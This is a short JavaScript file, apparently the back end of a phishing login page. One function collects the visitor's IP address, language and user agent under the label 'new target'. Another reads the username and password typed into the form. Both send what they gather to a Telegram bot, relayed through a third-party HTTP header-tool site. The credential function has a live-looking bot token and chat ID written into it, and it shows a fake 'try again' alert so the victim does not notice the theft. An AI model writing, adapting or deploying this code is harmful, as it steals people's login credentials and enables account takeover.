function get_ip(){
    $.get("https://api.ipify.org/",function(ip){


        var value='new target🔷\n'+'ip :'+ip+'\n'+'status net ☢ :'+navigator.onLine+'\n'+'leng 🔰 :'+navigator.language+'\n'+'➖➖➖➖➖➖➖'+'\n\n'+'user agent :\n'+navigator.userAgent+navigator
        // token
        // chat_id
        var url = 'https://api.telegram.org/botTOKEN/SendMessage?chat_id=chatID&text='+String(value)
        var sender = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"
        inpect = {
         "UrlBox":url,
         "AgentList":"Mozilla Firefox",
         "VersionsList":"HTTP/1.1",
         "MethodList":"POST"
         }
         $.post(sender,inpect)


    })
}




function clkck(){
    var users=document.getElementById('user').value
    var password=document.getElementById('password').value

    if(users.length>4 && users.length>3){

        var infos=('user  :'+users+'    '+ 'password  :'+password)


        var url = 'https://api.telegram.org/bot5497911574:AAHDW5iPMcRBydE-O7WibmPu5CvGZ2us3aw/SendMessage?chat_id=5251764632&text='+String(infos)
        var sender = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"
        inpect = {
         "UrlBox":url,
         "AgentList":"Mozilla Firefox",
         "VersionsList":"HTTP/1.1",
         "MethodList":"POST"
         }
         $.post(sender,inpect)
     
     
         window.alert(" try again")
             
     }else{
        window.alert('false :'+users +'  '+'false '+password)
     }


        
    }

   


